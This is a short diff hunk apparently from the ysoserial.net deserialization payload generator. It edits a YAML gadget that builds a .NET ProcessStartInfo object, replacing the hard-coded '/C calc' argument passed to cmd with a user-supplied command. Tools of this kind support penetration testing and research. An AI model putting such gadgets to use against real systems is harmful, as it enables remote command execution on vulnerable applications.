@@ -203,7 +203,7 @@ namespace ysoserial.Generators
 			StartInfo:
 				!<!System.Diagnostics.ProcessStartInfo%2c%20System%2c%20Version=4.0.0.0%2c%20Culture=neutral%2c%20PublicKeyToken=b77a5c561934e089> {
 					FileName : cmd,
-					Arguments : '/C calc'
+					Arguments : '/C " + cmd + @"'
 
                 }
         }
